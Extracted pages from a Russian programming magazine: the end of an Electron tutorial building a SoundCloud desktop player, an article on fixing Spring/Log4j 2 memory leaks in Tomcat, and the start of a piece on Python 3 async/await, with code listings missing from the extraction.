свойства main равно main.js (соответствует значению, введенному при за-
просе entry point во время выполнения команды npm  init), в противном
случае его необходимо скорректировать вручную, чтобы оно соответствовало
имени главного .js-файла проекта.
   Electron можно установить только для нашего проекта:

$ npm install --save electron

или глобально:

$ npm install -g electron

Пора запускать! Если Electron был установлен локально, это делается сле-
дующей строкой (если он был установлен глобально, путь указывать необяза-
тельно):

$ ./node_modules/.bin/electron .

Через несколько мгновений откроется окно нашего первого приложения.


                                                   Первое приложение





Обрати внимание, что сразу же открыто привычное окно DevTools. Заголовок
и текст окна соответствуют заданным; кроме того, у приложения есть типовое
главное меню.

ВИДЖЕТ SOUNDCLOUD
Виджет SoundCloud встраивается в веб-страницу как IFrame и позволяет про-
игрывать отдельные композиции с сайта SoundCloud или их списки. Он предо-
ставляет базовый интерфейс для управления проигрыванием и разнообраз-
ную информацию о композиции.

API виджета
Методы виджета
Из методов API виджета для управления проигрыванием мы будем использо-
вать следующие:
•  play — начать проигрывание композиции;
•  pause — приостановить проигрывание композиции (пауза);
•  toggle — переключить проигрывание / приостановка;
•  prev — перейти к предыдущей композиции (для списка);
•  next — перейти к следующей композиции (для списка);
•  bind — добавить обработчик события виджета.

В числе прочих методов: skip, load, seekTo, setVolume, unbind.

События виджета
События виджета делятся на две группы: аудиособытия и события пользова-
тельского интерфейса.
   Аудиособытия связаны с проигрываемой композицией и уведомляют
об изменениях ее состояния в проигрывателе, передавая объект с инфор-
мацией о текущей позиции в проигрываемом файле или прогрессе загрузки
(relativePosition, loadProgress, currentPosition).
   События пользовательского интерфейса виджета уведомляют о действиях
пользователя, не связанных напрямую с проигрыванием композиции.
  Мы используем следующие события:
•  READY — виджет загрузил данные и готов принимать внешние вызовы;
•  PLAY — начато проигрывание композиции;
•  PAUSE — проигрывание композиции приостановлено.

Остальные события: LOAD_PROGRESS, PLAY_PROGRESS, FINISH, SEEK, CLICK_
DOWNLOAD, OPEN_SHARE_PANEL, ERROR.
   Дополнительно можно получить информацию о текущем состоянии вид-
жета с помощью методов getVolume, getDuration, getPosition, getSounds,
getCurrentSound, getCurrentSoundIndex, isPaused. Информация возвра-
щается в callback-функции. Из них нам понадобится метод getCurrentSound,
возвращающий информацию о текущей композиции.
   Полное описание API виджета: Widget API, краткое введение и пример ис-
пользования.

Добавление виджета на страницу
Для того чтобы отобразить на нашей странице виджет SoundCloud, внутри эле-
мента <body> добавим элемент <iframe>, в котором загрузится сам виджет:





Полный список параметров виджета приведен  здесь: SoundCloud  Player
Widget — Customize Parameters (для предыдущей версии, использующей Flash).
   Для выбора композиции или их списка и настройки визуального представ-
ления виджета можно нажать кнопку Share на понравившемся списке ком-
позиций (если выбрана отдельная композиция, то будет невозможно пере-
мещаться к следующей/предыдущей композиции), выбрать закладку Embed
и скопировать предлагаемый код; установив галочку More Options, можно на-
строить несколько дополнительных параметров.
  Можем перезапустить приложение, чтобы убедиться, что виджет действи-
тельно загрузился внутри нашего приложения.

Инициализация API виджета SoundCloud
Для доступа к API виджета необходимо добавить в тег <head> загрузку следу-
ющего сценария:



Туда же добавим загрузку файла, в котором будут размещаться основные
функции браузерной части приложения:


А тег <body> дополним кнопками управления проигрыванием:





Создадим файл soundcloud.js, добавив в него функцию, которая будет вы-
полняться при загрузке окна браузера:





И собственно вызов этой функции по событию window onload:





Теперь при запуске приложения в консоль должен быть выведен объект
widget.

Методы и события API виджета SoundCloud
Привяжем методы виджета, предназначенные для управления проигрыванием
композиции, напрямую к кнопкам управления на странице (в функции initSC):





Теперь кнопки на форме начнут управлять виджетом и информация о событиях
будет выводиться в консоль.
   Также добавим вывод в консоль уведомлений о событиях виджета:





Добавим обработчик события виджета READY, в котором должна располагать-
ся основная логика взаимодействия с ним. Внутри него добавим обработчик
события начала проигрывания композиции PLAY, в котором запросим и выве-
дем информацию о текущей композиции и доступную информацию о состоя-
нии виджета:





                           Продолжение статьи
КОДИНГ



       Начало статьи
ELECTRON’НАЯ
 МУЗЫКАПРЕВРАЩАЕМ SOUNDCLOUD В МОБИЛЬНОЕ
     ПРИЛОЖЕНИЕ С ПОМОЩЬЮ КРУТЕЙШЕГО
               ФРЕЙМВОРКА



Иконка в области уведомлений
Добавление иконки в область уведомлений
Одна из функций, привычных пользователю компьютера, но невозможная
для веб-страницы, — это иконка с выпадающим меню в области уведомлений.
Добавим в файл main.js:





Под Linux отображение иконки в области уведомлений имеет свои особенно-
сти и зависит от конкретного дистрибутива. Подробнее о работе с областью
уведомлений — здесь.

Модификация главного меню
Хотя мы не задавали главное меню, Electron автоматически создал его
для приложения с набором пунктов по умолчанию. Это меню можно как полно-
стью переопределить, так и модифицировать. Для примера дополним главное
меню приложения новым пунктом, добавив в main.js:





Контекстные всплывающие меню
Кроме главного меню приложения и меню иконки в области уведомлений,
можно создавать и контекстные всплывающие меню, открывающиеся при на-
жатии на правую кнопку мыши на веб-странице по событию contextmenu объ-
екта window.
   Дополнительная информация по объектам Menu и MenuItem с примерами
доступна по ссылкам: Menu и MenuItem.

Процессы и обмен данными между ними
Пора познакомиться с архитектурой приложения Electron. В нем выполняет-
ся два типа процессов: Main Process и Renderer Process. Main Process —
главный процесс, который выполняет сценарий, указанный в поле main фай-
ла package.json (по умолчанию равный main.js). Главный процесс создает
объекты типа BrowserWindow, отображающие веб-страницы, из которых стро-
ится интерфейс приложения. Каждая веб-страница выполняется в отдельном
процессе, называемом Renderer Process.
   Поскольку окно браузера выполняется в Renderer  Process, а основной
процесс, взаимодействующий с областью уведомлений, — в Main  Process,
напрямую обращаться к одному из другого невозможно.
  Один  из  методов  организации  взаимодействия  между  процессами
в Electron — объекты ipcMain и ipcRenderer, используемые в основном про-
цессе Main Process и процессе (или процессах) Renderer Process, отрисо-
вывающем веб-страницу. С помощью их методов send и sendSync процессы
могут обмениваться синхронными и асинхронными сообщениями. Обработчи-
ку сообщения в процессе-получателе первым параметром передается объект
event с двумя свойствами, returnValue и event.sender. С помощью первого
из них обработчик синхронного сообщения может вернуть результат отправи-
телю; второй хранит отправителя сообщения, и асинхронный обработчик может
вернуть результат, отправив сообщение с помощью event.sender.send().
   Другой вариант организовать взаимодействие между процессами — мо-
дуль remote, который позволяет обмениваться данными в стиле вызовов RPC,
вызывая методы другого процесса. В main.js, в описании выпадающего меню
иконки области уведомлений (вызов метода Menu.buildFromTemplate()), из-
меним обработчики нажатия на пункты меню с вывода в консоль на отправку
сообщений следующим образом:





В файле soundcloud.js подключим объекты ipcRenderer из модуля electron
первой строкой внутри основной функции initSC:

const { ipcRenderer } = require('electron')

И добавим в этом же файле, в конце обработчика события SC.Widget.Events.
READY, обработчики этих событий:





Теперь при получении сообщений do-play и do-pause будут вызываться со-
ответствующие методы виджета и мы можем управлять виджетом из области
уведомлений.
  Добавим передачу уведомлений в обратную сторону, о событиях виджета.
Добавим в конце callback-функции widget.getCurrentSound строку, которая
отправит сообщение sc-play главному процессу в момент начала новой ком-
позиции с информацией о ее авторе и названии:


В конце обработчика события SC.Widget.Events.READY добавим обработку
события SC.Widget.Events.PAUSE, при его получении уведомив об этом глав-
ный процесс сообщением sc-pause.





В main.js добавим функцию, изменяющую иконку для области уведомлений:





и обработчики наших событий sc-play и sc-pause:





ВСПЛЫВАЮЩИЕ УВЕДОМЛЕНИЯ
Создание всплывающих уведомлений в Electron реализуется через обычный
Notifications API браузера. Единственное отличие — у пользователя не бу-
дет запрашиваться разрешение о выводе уведомлений.
   Для  отображения  уведомления  необходимо  создать  объект  типа
Notification, вызвав его конструктор с текстом заголовка и параметрами,
в числе которых иконка, текст уведомления и флаг разрешения звукового опо-
вещения при отображении уведомления. Так как мы проигрываем музыкаль-
ную композицию, звук нужно будет отключить. Создадим файл notification.
js, который будет выводить само уведомление и вызывать callback при клике
на уведомлении:





Подключим этот модуль, добавив в первые строки функции initSC файла
soundcloud.js:


И вызов этой функции внутри обработчика события SC.Widget.Events.PLAY
виджета; ее callback передаст сообщение sc-open главному процессу, уведо-
мив его о том, что пользователь кликнул на уведомлении:





Системные диалоги и запуск внешнего приложения
В основном процессе при нажатии на уведомление мы будем открывать в бра-
узере по умолчанию страницу с текущей композицией.
   Для этого используем функцию shell.openExternal(). Она выполняет
действие по умолчанию для типа данных, переданных в качестве параметра.
Если этой функции будет передан URL, откроется окно браузера по умолча-
нию, который загрузит страницу, соответствующую этому URL.
   Необходимо отметить, что источником данных в этом случае служит сторон-
ний виджет, расположенный на стороннем сайте, и нельзя полагаться на то,
что в поле permalink_url текущей композиции будет именно URL, а не, на-
пример, скрипт с командой на удаление всего содержимого диска.
   Для демонстрационного примера мы ограничимся запросом пользовате-
ля на разрешение выполнения данного действия. Отображение системных ди-
алогов реализуется с помощью метода showMessageBox() объекта dialog.
Всего доступно четыре диалоговых окна; кроме showMessageBox(), есть еще
showOpenDialog и showSaveDialog для стандартных диалоговых окон откры-
тия и сохранения файла и showErrorBox. Документация по объекту dialog
приведена здесь.
  Добавим в main.js обработчик сообщения sc-open, отправляемого окном
браузера при клике пользователя на уведомлении:





                                                Внешний вид приложения


Обработка глобальных горячих клавиш
Зарегистрируем горячую клавишу Control + Shift + P (Command + Shift +
P под macOS) для начала или приостановки проигрывания композиции.
  Добавим в main.js:





Модификатор CommandOrControl соответствует клавише Command под macOS
и Control под Linux и Windows.
  Добавим в файл soundcloud.js рядом с обработчиками сообщений do-
play и do-pause вызов метода виджета widget.toggle() при получении со-
бытия do-toggle (обработчик события SC.Widget.Events.READY):

ipcRenderer.on('do-toggle', => widget.toggle() )

Полный список обозначений клавиш и модификаторов приведен в документа-
ции здесь.

Блокировка открытия новых окон и навигации
Виджет SoundCloud содержит ссылки на другие страницы сайта. Наше прило-
жение однооконное, и открытие других окон при клике на ссылку нежелатель-
но. При навигации на другую страницу в том же окне, в отличие от браузера,
интерфейс нашего приложения не позволяет вернуться назад.
   Ограничим действия пользователя — заблокируем открытие нового окна
и навигацию, вызвав для этого метод событий preventDefault() внутри об-
работчиков событий new-window и will-navigate объекта win.webContent
следующим образом (в конце функции createWindow файла main.js, под
объявлением переменной webContents):





Предотвращение закрытия главного окна приложения
Кроме события closed, вызываемого при закрытии окна, у окна есть событие
close, которое вызывается перед закрытием окна, и, если вызвать его метод
preventDefault(), окно закрыто не будет.
  Добавим в начале файла main.js переменную preventClose — флаг,
определяющий, можно ли закрывать главное окно приложения:



Добавим внутри функции createWindow файла main.js блокировку закрытия
окна, если установлен флаг preventClose:





И в конце файла main.js определим обработчик события app.on('before-
quit'), вызываемого при попытке завершить приложение в целом (в нашем
случае будет вызвано при выборе пункта меню Quit):

app.on('before-quit', => preventClose = false)


БЕЗОПАСНОСТЬ
Мы уже затрагивали вопросы безопасности, когда открывали в браузере URL,
полученный с сервера, выполняя для него действие по умолчанию. Каждый
раз, когда код, полученный с удаленного ресурса, выполняется локально, су-
ществует риск злонамеренного доступа к локальным ресурсам. В связи с этим
настоятельно советуем почитать замечания о безопасности в Electron.

Возможности фреймворка

В числе других возможностей интеграции с интерфейсом операционной си-
стемы: список последних документов (Windows и macOS), меню приложения
для док-панели macOS, объявление списка пользовательских задач приложе-
ния в Windows, миниатюры списка задач Windows, добавление ссылок в панель
запуска Unity (Linux), индикатор хода выполнения, накладной значок и под-
светка кнопки приложения на панели задач Windows, перетаскивание файлов
из окна Electron.
  Среди системных возможностей — доступ к информации об изменении со-
стоянии монитора питания, блокировка перехода в спящий режим, получе-
ние информации об экране и изображения на экране, получение уведомлений
об изменении статуса сетевого подключения (онлайн/офлайн) и многое другое.



Для подготовки дистрибутива можно использовать проект electron-packager,
позволяющий собрать исполняемые файлы и исходный код приложения в еди-
ный пакет. Для обхода ограничений на длину имен файлов и ускорения за-
грузки модулей Electron поддерживает упаковку файлов приложения в пакет
с расширением .asar, содержимое которого доступно из самого приложения
с использованием стандартного файлового API.
   Electron обладает встроенным механизмом автоматических обновлений
autoUpdater. Реализован и механизм автоматической отправки отчетов о паде-
ниях приложения на удаленный сервер с помощью объекта crashReporter.



         АЛЬТЕРНАТИВЫ
             Конкурирует с Electron проект NW.js, ранее носивший назва-
            ние node-webkit.
КОДИНГ


][-ИССЛЕДОВАНИЕ:
КУДА УХОДИТ
ПАМЯТЬ
 РАЗБИРАЕМСЯ С MEMORY LEAKS
 НА ПРИМЕРЕ СОВМЕСТНОГО
 ИСПОЛЬЗОВАНИЯ SPRING
 И LOG4J 2 В КОНТЕЙНЕРЕ

                                                                               Андрей Буров СЕРВЛЕТОВ                                                                                                     andreyburov@syberia.net



Каждый, кто разрабатывал веб-приложения на Java,
сталкивался с проблемой утечек памяти при останов-
ках и переустановках своих программ. Если же об этом
ты слышишь впервые, то могу заверить: с очень большой
вероятностью твои творения текут. Причин может быть
огромное множество, и об одной из них я бы хотел рас-
сказать в этой статье.


Даже если ты никогда не пользовался ни Spring, ни Log4j 2, то после прочтения
этой статьи ты все равно получишь довольно четкое представление о том, по-
чему такого рода утечки могут возникать и как с ними бороться.


Хотя эта статья и создана для разработчиков, в ней почти отсутствует про-
граммный код: все, что нас будет интересовать, — это конфигурационные фай-
лы. Мы будем наблюдать, как простое подключение новой библиотеки в нашу
программу будет приводить к утечкам памяти, а небольшие правки в конфигу-
рации — исправлять их. Впрочем, давай обо всем по порядку.

РАЗГОВОРЧИВЫЙ SPRING
Роль Spring Framework при разработке промышленных Java-приложений труд-
но переоценить. Spring способен в разы сократить объем программного кода,
который тебе придется написать и сопровождать, а при умелом использова-
нии — сделать программу простой, понятной и адаптируемой к изменчивым
требованиям заказчика.
  При тестировании и эксплуатации любой системы обязательно возникнет
необходимость анализировать ее поведение. Для этого, как правило, исполь-
зуются специальные библиотеки для ведения журнала операций, или, совре-
менным языком, библиотеки для вывода логов (логирования).
  Приведем простой пример. С помощью Spring-WS можно вызывать сторон-
ние SOAP-службы. Ты отправляешь запрос в такую службу, получаешь ответ,
выполняешь над ответом какие-нибудь операции и выводишь результат. Поль-
зователь твоей системы смотрит на этот результат и говорит тебе, что он не-
корректный, а значит, с его точки зрения, твоя программа содержит ошибки.
   Возможно, этот пользователь прав. А возможно, ты получил некорректный
ответ из сторонней службы. Единственный способ узнать — это чтение логов,
которые пишет твоя система. Ты можешь проверить корректность твоего за-
проса и корректность ответа, который тебе пришел. В случае с SOAP-служба-
ми можно выводить в лог XML запросов и ответов. Тогда у тебя будут железные
аргументы, что ошибка не на твоей стороне, если это действительно так.
  Ты можешь сам написать код, который будет логировать XML-сообще-
ния перед отправкой и после получения ответа. Однако не стоит усложнять
свою программу лишней логикой, если Spring-WS уже логирует эти сообще-
ния за тебя. Твоя задача заключается только в том, чтобы перенаправить логи
Spring-WS в ту систему логирования, которая используется в программе. На-
пример, в Log4j 2.
   Далее я приведу пример простого веб-приложения, которое выводит логи
Spring через конфигурацию Log4j 2. При этом будут наблюдаться утечки памя-
ти при остановке и удалении приложения из контейнера сервлетов.

УЧИМСЯ СЛУШАТЬ
Создадим пустой проект веб-приложения на основе Apache Maven. Назовем
его, например, spring-log4j2-memory-leaks. В нем почти не будет программно-
го кода: нас интересуют только конфигурационные файлы и вывод логов в кон-
соль. Сначала в файле pom.xml объявим только одну зависимость:





Чтобы Spring инициализировал свой контекст при старте веб-приложения, не-
обходимо зарегистрировать его в дескрипторе развертывания (web.xml):





Здесь файл applicationContext.xml пуст. Сейчас нам не нужно каким-то особым
образом конфигурировать Spring:





Соберем и опубликуем наше приложение. В этой статье в качестве контейне-
ра сервлетов будет использоваться Apache Tomcat версии 8.0.38. При запуске
приложения он выводит в лог сообщения об инициализации контекста Spring:

15-Oct-2016 12:16:03.923 INFO [http-apr-8080-exec-10]
    org.springframework.web.context.ContextLoader.initWebApplication
    Context Root WebApplicationContext: initialization started
15-Oct-2016 12:16:04.303 INFO [http-apr-8080-exec-10]
    org.springframework.web.context.support.XmlWebApplicationContext.
    prepareRefresh Refreshing Root WebApplicationContext: startup date
[Sat Oct 15 12:16:04 MSK 2016]; root of context hierarchy
    15-Oct-2016 12:16:04.493 INFO [http-apr-8080-exec-10]
    org.springframework.beans.factory.xml.XmlBeanDefinitionReader.
    loadBeanDefinitions Loading XML bean definitions from ServletContext
    resource [/WEB-INF/spring/applicationContext.xml]
15-Oct-2016 12:16:04.738 INFO [http-apr-8080-exec-10]
    org.springframework.web.context.ContextLoader.initWebApplication
    Context Root WebApplicationContext: completed in 815 ms

Теперь подключим к проекту Log4j 2:





Также создадим для него файл с конфигурацией (log4j2.xml):





Как видишь, конфигурация предельно проста: логи Log4j 2 выводятся в кон-
соль в определенном формате.
   Теперь если мы опять соберем проект и опубликуем его, то увидим,
что в логах появилось большое количество записей об инициализации контек-
ста Log4j 2:

2016-10-15 12:41:32,949 http-apr-8080-exec-29 DEBUG Starting
    LoggerContext[name=/spring-log4j2-memory-leaks-1.0] from
    configuration at file:/C:/Program%20Files/apache-tomcat-8.0.38/
    webapps/spring-log4j2-memory-leaks-1.0/WEB-INF/log4j2.xml
...
2016-10-15 12:41:33,130 http-apr-8080-exec-29 DEBUG LoggerContext
    [name=/spring-log4j2-memory-leaks-1.0, org.apache.logging.log4j.
    core.LoggerContext@2e7453a5] started OK with configuration
    XmlConfiguration[location=C:\Program Files\apache-tomcat-8.0.38\
    webapps\spring-log4j2-memory-leaks-1.0\WEB-INF\log4j2.xml].

Однако мы все еще не видим логов Spring! Дело в том, что в нем использу-
ется Apache Commons Logging, а значит, мы должны подключить в наш про-
ект Commons Logging Bridge для перенаправления логов из Commons Logging
в Log4j 2. Для этого необходимо только добавить новую зависимость в проект:





В очередной раз пересоберем и опубликуем проект. Теперь мы можем на-
блюдать в логах низкоуровневые детали инициализации контекста Spring. Это
означает, что Spring-WS из нашего примера в начале статьи также будет выво-
дить в лог XML, которые он отправляет и получает. И не только он. Все библио-
теки Spring будут извещать нас о том, что они делают. К примеру, Spring JDBC
выведет в лог запросы к БД, Spring AMQP — сообщения из очереди и так да-
лее. В нашем программном коде будет меньше вызовов логгера, а значит,
он станет проще.

УТЕЧКИ ПАМЯТИ
На этой оптимистической ноте следовало бы завершить статью, однако на-
стройка нашего веб-приложения еще не закончена. Дело в том, что если мы пе-
резапустим нашу программу, например нажав на кнопку Reload в администра-
тивной панели Tomcat’а, как показано на рис. 1, то создадим утечку памяти.





                                                                Рис. 1. Кнопка Reload

Ты спросишь, откуда я знаю, что появилась утечка? Есть несколько несложных
способов проверить. Самый простой — кнопка Find leaks в административной
панели Tomcat’а (рис. 2).





                                                             Рис. 2. Кнопка Find leaks

Эта кнопка запускает очистку мусора и выводит на экран список приложений,
которые не запущены, но для которых не удалось освободить всю используе-
мую память (рис. 3).





                                                                Рис. 3. Утечки памяти

На рисунке видно, что в памяти оста-
лись классы от трех запусков нашего
приложения. Чем большее число раз
мы будем перезапускать программу,
тем больше классов не будет очище-
но и тем больше памяти будет потре-
блять Tomcat.
  Неочищенный мусор логгера так-
же можно увидеть в MBean Browser
в Oracle Java Mission Control (рис. 4).
  Еще один способ — с помощью
команды jmap  -histo  tomcat  pid
(. В результате ты увидишь множе-
ство классов из твоего приложения,
которые  дублируются  столько  раз,
сколько ты перезапускаешь прило-                                                     Рис. 4. Oracle Java Mission Control
жение, плюс то, что сейчас работает
(в нашем случае: 3 + 1 = 4). Пример:

2065: 1 24 org.apache.logging.log4j.core.impl.Log4jContextFactory
2066: 1 24 org.apache.logging.log4j.core.impl.Log4jContextFactory
2067: 1 24 org.apache.logging.log4j.core.impl.Log4jContextFactory
2068: 1 24 org.apache.logging.log4j.core.impl.Log4jContextFactory

Можно задать резонный вопрос: а так ли часто мы перезапускаем веб-при-
ложения? Ответ простой: часто. Например, при установке новой версии. Или
при изменении конфигурации программы. Если ты захочешь изменить уровень
логирования в приложении с debug на info, то ты откроешь *.war-файл и отре-
дактируешь в нем log4j2.xml. Tomcat автоматически подхватит твои изменения
и сделает рестарт приложения, что, в свою очередь, вызовет утечку памяти.

НИ ШАГУ НАЗАД: ИСПРАВЛЯЕМ УТЕЧКИ
Теперь, когда наличие проблемы не вызывает сомнений, возникает логичный
вопрос, что же эту проблему вызвало. На него есть два ответа, и оба верные.
   Первый, самый простой: добавление в проект зависимости log4j-jcl. И дей-
ствительно, если убрать эту зависимость, то проблема уходит. Но также исче-
зают и логи Spring, а мы хотим их видеть в нашем проекте.
   Второй ответ состоит в том, что при остановке веб-приложения сначала
уничтожается контекст Log4j 2, а потом — Spring. Это приводит к интересному
эффекту: при уничтожении своего контекста Spring активно пишет в лог, одна-
ко при этом Log4j 2 уже уничтожен! Ему ничего не остается, как выполнить по-
вторную инициализацию. Это можно увидеть в логах:

2016-10-15 16:02:26,185 http-apr-8080-exec-87 DEBUG Stopped
    XmlConfiguration[location=C:\Program Files\apache-tomcat-8.0.38\
    webapps\spring-log4j2-memory-leaks-1.0\WEB-INF\log4j2.xml] OK

Это сообщение о том, что Log4j 2 остановлен. Однако далее инициализация
происходит заново:

2016-10-15 16:02:26,405 http-apr-8080-exec-87 DEBUG Starting
    LoggerContext[name=564a4bbb, org.apache.logging.log4j.core.
    LoggerContext@ a67f645]...
...
2016-10-15 16:02:26,481 http-apr-8080-exec-87 DEBUG LoggerContext
    [name=564a4bbb, org.apache.logging.log4j.core.
    LoggerContext@a67f645] started OK.

Tomcat об этом не знает и со спокойной совестью завершает работу с прило-
жением, не выполняя повторное уничтожение контекста, что и вызывает утечку
памяти.
   Чтобы понять, почему так происходит, нужно разобраться в механизме
создания и уничтожения контекстов в Tomcat’е и в любом другом контейнере
сервлетов, который поддерживает спецификацию Servlet Spec 3.0+.
   Если разработчик библиотеки хочет, чтобы при использовании его детища
в веб-окружении выполнялись подготовительные действия, то ему следует ре-
ализовать интерфейс ServletContainerInitializer, в котором есть единственный
метод onStartup.
   У Log4j 2 и Spring есть свои реализации этого интерфейса, которые назы-
ваются, соответственно, Log4jServletContainerInitializer и SpringServletContainer
Initializer.
   Таким образом, при старте нашего веб-приложения первым делом Tomcat
вызывает метод onStartup у каждой из этих двух реализаций. При этом если
покопаться в документации к Log4j 2, то можно найти информацию о том, чт
о Log4jServletContainerInitializer обязан вызываться первым.
   Впрочем, с этим как раз все в порядке: если поставить точки останова вну-
три обеих реализаций onStartup, то увидим, что Log4jServletContainerIn
itializer действительно вызывается в первую очередь. Об этом позаботи-
лись разработчики Log4j 2, установив необходимый порядок вызовов в своем
файле web-fragment.xml.
   Обрати  внимание  на  интересную  деталь:  в  интерфейсе  Servlet-
ContainerInitializer есть метод onStartup, но нет ничего похожего на,
скажем, метод onDestroy. Так какой же метод должен вызвать контейнер
сервлетов, чтобы уничтожить контекст?
  В  Servlet Spec  2.5 и более ранних версиях инициализация и унич-
тожение  контекстов  происходили  только  в  реализациях  интерфейса
ServletContextListener в методах contextInitialized и contextDestroyed.
Однако в последних версиях спецификации, а значит, и в нашем случае реа-
лизации этого интерфейса тоже используются. Если мы внимательно изучим
пакеты с исходными кодами Log4j 2 и Spring, то сможем найти их: это классы
Log4jServletContextListener и ContextLoaderListener. У обоих уничтожение кон-
текста реализовано в методе contextDestroyed.
   Здесь появляется сразу множество вопросов. Как Tomcat понимает, когда
и в какой последовательности вызывать все эти методы? Откуда ему извест-
но о классах, которые их реализуют? Зачем нужен contextInitialized, если
есть onStartup? Давай попробуем разобраться.
  Выше я писал, что onStartup всегда вызывается в первую очередь,
и это действительно так. Классы, которые реализуют этот метод, долж-
ны быть зарегистрированы в файле META-INF.services/javax.servlet.
ServletContainerInitializer. Ты можешь его увидеть как в Log4j 2, так
и в Spring. Tomcat просматривает этот файл и вызывает onStartup для каждо-
го зарегистрированного там инициализатора.
   Давай теперь заглянем «под капот» Log4jServletContainerInitializer.
Там можно увидеть интересную строчку кода:


В  ней  регистрируется  Log4jServletContextListener,  у  которого  по-
том при остановке приложения будет вызван contextDestroyed. При этом
в contextInitialized также создается контекст логгера, если он еще не был
создан. Такое может быть, только если наш контейнер сервлетов не поддер-
живает спецификацию 3.0 или если мы отключили Log4jServletContainerIn
itializer. Все это тоже описано в документации к Log4j 2.
   Теперь давай сделаем финт ушами. Поставим точку останова на этой строч-
ке кода и посмотрим, что находится внутри переменной servletContext. А нахо-
дится там, вот уж неожиданность, ContextLoaderListener. Напомню, что это
реализация ServletContextListener от Spring. Она каким-то образом уму-
дрилась попасть туда даже раньше, чем вызвался первый инициализатор! Это
значит, что ее contextInitialized будет вызван до contextInitialized
Log4j 2, а contextDestroyed — после. Эту картину мы и наблюдали ранее:
сначала уничтожается логгер, а потом — Spring.
  В итоге у нас начинает складываться интересная последовательность дей-
ствий, которую выполняет Tomcat:
1. Регистрирует ContextLoaderListener.
2. Вызывает onStartup у Log4jServletContainerInitializer (в нем реги-
   стрируется Log4jServletContextListener).
3. Вызывает onStartup у SpringServletContainerInitializer.
4. Вызывает contextInitialized у ContextLoaderListener.
5. Вызывает contextInitialized у Log4jServletContextListener.
6. Вызывает contextDestroyed у Log4jServletContextListener.
7. Вызывает contextDestroyed у ContextLoaderListener.

Встает интересный вопрос: почему ContextLoaderListener регистрируется
раньше всего остального, а не, скажем, в SpringServletContainerInitiali
zer? Ответ прост: мы сами его зарегистрировали в дескрипторе развертыва-
ния в начале статьи, а по спецификации web.xml имеет более высокий приори-
тет (п. 8.2.2).
  С другой стороны, если бы мы этого не сделали, то Spring не инициализи-
ровался бы вовсе, так как SpringServletContainerInitializer не выпол-
няет напрямую регистрацию ContextLoaderListener. Вместо этого он ищет
в пакетах нашего приложения реализации своего собственного интерфей-
са WebApplicationInitializer и вызывает у них метод onStartup. В нашем про-
екте ничего подобного нет, поэтому SpringServletContainerInitializer,
по сути, «ничего не делает». Давай попробуем удалить файл web.xml и вместо
него добавить в наш проект такой класс:





Здесь AbstractContextLoaderInitializer, в свою очередь, реализует интерфейс
WebApplicationInitializer.
   Теперь если мы запустим и остановим наше приложение, то по логам
или по точкам останова можем увидеть, что последовательность вызовов
у Tomcat’а изменилась:
1. Вызывает onStartup у Log4jServletContainerInitializer (в нем реги-
   стрируется Log4jServletContextListener).
2. Вызывает onStartup у SpringServletContainerInitializer (в нем реги-
   стрируется ContextLoaderListener).
3. Вызывает contextInitialized у Log4jServletContextListener.
4. Вызывает contextInitialized у ContextLoaderListener.
5. Вызывает contextDestroyed у ContextLoaderListener.
6. Вызывает contextDestroyed у Log4jServletContextListener.

Теперь логгер уничтожается в последнюю очередь. Если проверим Tomcat
на утечки памяти, то обнаружим, что они пропали.
   Есть другой способ добиться того же эффекта, не написав при этом
ни  строчки  кода:  отключить  инициализатор  у  Log4j  2  и  объявить
Log4jServletContextListener в web.xml. Тогда наш дескриптор разверты-
вания примет следующий вид:





Здесь очень важно, чтобы Log4jServletContextListener был объявлен very
first, то есть выше, чем что-либо еще, в том числе и ContextLoaderListener.
Установка параметра isLog4jAutoInitializationDisabled в значение true
отключает инициализатор контекста Log4j 2. Такая конфигурация «делает
вид», что приложение запущено в контейнере сервлетов 2.5 или более ран-
нем, то есть в таком, который не поддерживает инициализаторы.
   Теперь последовательность вызовов у Tomcat’а будет немного другой:
1. Регистрирует Log4jServletContextListener.
2. Регистрирует ContextLoaderListener.
3. Вызывает  onStartup  у  Log4jServletContainerInitializer  (ничего
   не происходит, так как указан параметр isLog4jAutoInitializationDisa
   bled = true).
4. Вызывает   onStartup   у  SpringServletContainerInitializer   (ни-
   чего не происходит, так как в приложении нет ни одной реализации
   WebApplicationInitializer).
5. Вызывает contextInitialized у Log4jServletContextListener.
6. Вызывает contextInitialized у ContextLoaderListener.
7. Вызывает contextDestroyed у ContextLoaderListener.
8. Вызывает contextDestroyed у Log4jServletContextListener.

Здесь логгер также уничтожается в последнюю очередь, что и устраняет утечку
памяти, как в предыдущем случае.
  Оба решения довольно просты и лаконичны, в отличие от зубодробитель-
ных причин возникновения этой проблемы. Какое из них применять — решать
тебе.

ВЫВОДЫ
Борьба с утечками памяти при остановках
и переустановках веб-приложений вообще                               Ссылки на проекты
довольно-таки нетривиальная и сложная зада-
ча. Часто для решения таких проблем прихо-    С web.xml (zip)
дится с головой зарываться в чужой исходный
код. Хорошее руководство на эту тему можно     Без web.xml (zip)
найти и в документации к Tomcat’у: http://wiki.
apache.org/tomcat/MemoryLeakProtection. Од-
нако, как правило, его недостаточно.
  В общем случае можно посоветовать каждый раз при подключении но-
вой, незнакомой тебе библиотеки проверять, вызывает ли она утечки памяти
или нет. В каких-то случаях достаточно перенести эту библиотеку в папку lib
Tomcat’а (например, драйвер JDBC), а в других решение не столь очевидно.
  С другой стороны, можно вообще не заморачиваться на эту тему. С по-
добными утечками система может стабильно работать годами, потребляя
при этом памяти больше, чем нужно. Но сможешь ли ты спать спокойно по но-
чам, зная, что в твоей программе есть серьезный баг? Надеюсь, эта статья
не даст тебе это сделать :).
КОДИНГ
ВВВВ ГОЛОВЕГОЛОВЕГОЛОВЕГОЛОВЕВВ ГОЛОВЕГОЛОВЕ
ASYNC?ASYNC?ASYNC?ASYNC?ASYNC?ASYNC?
ТЕБЕТЕБЕТЕБЕТЕБЕТЕБЕТЕБЕ
НУЖЕННУЖЕННУЖЕННУЖЕННУЖЕННУЖЕН
AWAIT!AWAIT!AWAIT!AWAIT!AWAIT!AWAIT!
 НОВЫЕ АСИНХРОННЫЕ
 ВОЗМОЖНОСТИ PYTHON 3





                                         Николай Марков
                                                 enchantner@gmail.com

Иногда у досточтимых джентльменов, обращающих вни-
мание на разнообразие современных технологий асин-
хронности в Python, возникает вполне закономерный во-
 прос: «Что, черт возьми, со всем этим делать?» Тут вам
и эвентлеты, и гринлеты, и корутины, и даже сам дьявол
в ступе (Twisted). Поэтому собрались разработчики, по-
чесали репу и решили: хватит терпеть четырнадцать кон-
курирующих стандартов, надо объединить их все в один!
И как водится, в итоге стандартов стало пятнадцать...
Ладно-ладно, шутка :). У событий, описанных в этой ста-
 тье, конец будет более жизнеутверждающий.

